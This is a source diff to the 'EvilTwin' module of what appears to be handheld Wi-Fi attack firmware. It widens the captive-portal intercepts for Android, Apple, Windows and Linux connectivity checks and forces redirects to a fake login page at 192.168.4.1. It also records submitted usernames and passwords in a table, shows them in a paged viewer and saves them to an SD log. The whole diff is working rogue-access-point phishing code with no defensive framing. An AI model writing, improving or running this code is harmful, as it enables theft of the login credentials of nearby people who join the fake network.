@@ -123,6 +123,7 @@ void EvilTwin::start(const char* ssid) {
     _captureCount       = 0;
     _lastUser[0]        = '\0';
     _lastPass[0]        = '\0';
+    memset(_creds, 0, sizeof(_creds));
     _tmpl               = 0;
     _dirty              = true;
     _isClone            = false;
@@ -215,14 +216,22 @@ void EvilTwin::start(const char* ssid) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
         if (k == 't' || k == 'T') {
-            _useCustomTemplate = false;   // switch back to built-ins
+            _useCustomTemplate = false;
             _tmpl = (_tmpl + 1) % 2;
             _dirty = true;
         }
-        if (k == 's' || k == 'S') {
-            server.stop(); dns.stop();   // pause portal during picker
+        if (k == 'p' || k == 'P') {
+            server.stop(); dns.stop();
             if (pickSdTemplate()) _dirty = true;
-            setupRoutes(); server.begin(); // resume
+            setupRoutes(); server.begin();
+        }
+        if (k == 'c' || k == 'C') {
+            showCredsTable();
+            drawScreen(); lastDraw = millis(); _dirty = false;
+        }
+        if (k == 's' || k == 'S') {
+            saveCredsToSD();
+            drawScreen(); lastDraw = millis(); _dirty = false;
         }
     }
 
@@ -468,21 +477,37 @@ void EvilTwin::setupRoutes() {
     server.on("/",     HTTP_GET,  [this]() { handleRoot(); });
     server.on("/post", HTTP_POST, [this]() { handlePost(); });
 
-    // Captive portal intercept routes (from Bruce firmware)
     auto redir = [this]() { handleRedirect(); };
-    server.on("/generate_204",        HTTP_GET, redir);
-    server.on("/gen_204",             HTTP_GET, redir);
-    server.on("/hotspot-detect.html", HTTP_GET, redir);
-    server.on("/ncsi.txt",            HTTP_GET, redir);
-    server.on("/connecttest.txt",     HTTP_GET, redir);
-    server.on("/redirect",            HTTP_GET, redir);
-    server.on("/canonical.html",      HTTP_GET, redir);
-    server.on("/success.txt",         HTTP_GET, redir);
 
+    // Android (all versions)
+    server.on("/generate_204",                          HTTP_GET, redir);
+    server.on("/gen_204",                               HTTP_GET, redir);
+    server.on("/connectivity-check.html",               HTTP_GET, redir);
+    server.on("/check_network_status.php",              HTTP_GET, redir);
+
+    // iOS / macOS
+    server.on("/hotspot-detect.html",                   HTTP_GET, redir);
+    server.on("/library/test/success.html",             HTTP_GET, redir);
+    server.on("/success.html",                          HTTP_GET, redir);
+
+    // Windows
+    server.on("/ncsi.txt",                              HTTP_GET, redir);
+    server.on("/connecttest.txt",                       HTTP_GET, redir);
+    server.on("/redirect",                              HTTP_GET, redir);
+
+    // Firefox / Linux
+    server.on("/canonical.html",                        HTTP_GET, redir);
+    server.on("/success.txt",                           HTTP_GET, redir);
+    server.on("/detected.html",                         HTTP_GET, redir);
+
+    // catch-all
     server.onNotFound([this]() { handleRedirect(); });
 }
 
 void EvilTwin::handleRoot() {
+    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    server.sendHeader("Captive-Portal-URL", "http://192.168.4.1/");
+
     if (_useCustomTemplate && sd.isReady()) {
         File f = SD.open(_sdTemplatePath);
         if (f) {
@@ -501,23 +526,42 @@ void EvilTwin::handlePost() {
     String pass = server.arg("pass");
 
     if (user.length() > 0 || pass.length() > 0) {
+        strncpy(_lastUser, user.c_str(), 47); _lastUser[47] = '\0';
+        strncpy(_lastPass, pass.c_str(), 47); _lastPass[47] = '\0';
+        if (_captureCount < ET_MAX_CREDS) {
+            strncpy(_creds[_captureCount].user, user.c_str(), 47);
+            _creds[_captureCount].user[47] = '\0';
+            strncpy(_creds[_captureCount].pass, pass.c_str(), 47);
+            _creds[_captureCount].pass[47] = '\0';
+        }
         if (sd.isReady()) {
             sd.ensureDir("/logs");
             sd.appendLine(ET_LOG_PATH, user + "," + pass);
         }
-        strncpy(_lastUser, user.c_str(), 47); _lastUser[47] = '\0';
-        strncpy(_lastPass, pass.c_str(), 47); _lastPass[47] = '\0';
         _captureCount++;
         _dirty = true;
     }
 
     server.sendHeader("Location", "http://192.168.4.1/");
-    server.send(302, "text/plain", "");
+    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    server.send(302, "text/html",
+        "<html><head>"
+        "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>"
+        "</head><body>"
+        "<a href='http://192.168.4.1/'>Continue</a>"
+        "</body></html>");
 }
 
 void EvilTwin::handleRedirect() {
     server.sendHeader("Location", "http://192.168.4.1/");
-    server.send(302, "text/plain", "");
+    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    server.sendHeader("Captive-Portal-URL", "http://192.168.4.1/");
+    server.send(302, "text/html",
+        "<html><head>"
+        "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>"
+        "</head><body>"
+        "<a href='http://192.168.4.1/'>Open portal</a>"
+        "</body></html>");
 }
 
 // ── Deauth frame injection ────────────────────────────────────────────────────
@@ -623,7 +667,118 @@ void EvilTwin::drawScreen() {
 
     dm.setCursor(4, dm.getCursorY());
     dm.setTextColor(0x7BEF);
-    dm.println("[q] quit  [t] built-in  [s] SD template");
+    dm.println("[q]quit [t]tmpl [p]portal [c]creds [s]save");
+}
+
+// ── Credentials table ─────────────────────────────────────────────────────────
+
+void EvilTwin::showCredsTable() {
+    dm.clearScreen();
+    dm.setDefaultTextSize();
+    dm.setCursor(4, outputY);
+
+    if (_captureCount == 0) {
+        dm.setTextColor(TFT_YELLOW);
+        dm.println("No credentials captured yet.");
+        delay(1500);
+        return;
+    }
+
+    int total  = min(_captureCount, ET_MAX_CREDS);
+    int pages  = (total + ET_CREDS_PER_PAGE - 1) / ET_CREDS_PER_PAGE;
+    int page   = 0;
+    bool redraw = true;
+
+    while (true) {
+        if (redraw) {
+            dm.clearScreen();
+            dm.setDefaultTextSize();
+
+            dm.setCursor(4, outputY);
+            dm.setTextColor(TFT_GREEN);
+            char hdr[40];
+            snprintf(hdr, sizeof(hdr), "Creds: %d total  (pg %d/%d)", _captureCount, page + 1, pages);
+            dm.println(hdr);
+            int sepY = dm.getCursorY();
+            dm.fillRect(4, sepY, 312, 1, TFT_DARKGREY);
+            dm.setCursor(4, sepY + 3);
+
+            int start = page * ET_CREDS_PER_PAGE;
+            int end   = min(start + ET_CREDS_PER_PAGE, total);
+            for (int i = start; i < end; i++) {
+                char buf[52];
+                dm.setCursor(4, dm.getCursorY() + 2);
+                dm.setTextColor(TFT_CYAN);
+                snprintf(buf, sizeof(buf), "#%d", i + 1);
+                dm.printText(buf);
+                dm.setTextColor(0x7BEF);
+                snprintf(buf, sizeof(buf), " %.38s", _creds[i].user);
+                dm.println(buf);
+                dm.setCursor(12, dm.getCursorY());
+                dm.setTextColor(TFT_WHITE);
+                snprintf(buf, sizeof(buf), "%.44s", _creds[i].pass);
+                dm.println(buf);
+            }
+
+            if (_captureCount > ET_MAX_CREDS) {
+                dm.setCursor(4, dm.getCursorY());
+                dm.setTextColor(TFT_YELLOW);
+                char warn[40];
+                snprintf(warn, sizeof(warn), "+%d more — see SD log", _captureCount - ET_MAX_CREDS);
+                dm.println(warn);
+            }
+
+            dm.setCursor(4, dm.getCursorY() + 2);
+            dm.setTextColor(0x7BEF);
+            dm.println("[n]next [p]prev [q]back");
+            redraw = false;
+        }
+
+        char k = inputHandler.getKeyboardInput();
+        if (!k) continue;
+        if (k == 'q' || k == 'Q') break;
+        if ((k == 'n' || k == 'N') && page < pages - 1) { page++; redraw = true; }
+        if ((k == 'p' || k == 'P') && page > 0)         { page--; redraw = true; }
+    }
+}
+
+void EvilTwin::saveCredsToSD() {
+    dm.clearScreen();
+    dm.setDefaultTextSize();
+    dm.setCursor(4, outputY);
+
+    if (_captureCount == 0) {
+        dm.setTextColor(TFT_YELLOW);
+        dm.println("No credentials to save.");
+        delay(1500);
+        return;
+    }
+
+    if (!sd.isReady()) {
+        dm.setTextColor(TFT_RED);
+        dm.println("SD card not ready.");
+        delay(1500);
+        return;
+    }
+
+    sd.ensureDir("/logs");
+
+    // Remove existing log and rewrite all in-memory creds cleanly
+    if (SD.exists(ET_LOG_PATH)) SD.remove(ET_LOG_PATH);
+
+    int saved = min(_captureCount, ET_MAX_CREDS);
+    for (int i = 0; i < saved; i++) {
+        sd.appendLine(ET_LOG_PATH, String(_creds[i].user) + "," + String(_creds[i].pass));
+    }
+
+    dm.setTextColor(TFT_GREEN);
+    char buf[48];
+    snprintf(buf, sizeof(buf), "Saved %d cred(s) to SD.", saved);
+    dm.println(buf);
+    dm.setCursor(4, dm.getCursorY());
+    dm.setTextColor(0x7BEF);
+    dm.println(ET_LOG_PATH);
+    delay(2000);
 }
 
 // ── SD template picker ────────────────────────────────────────────────────────
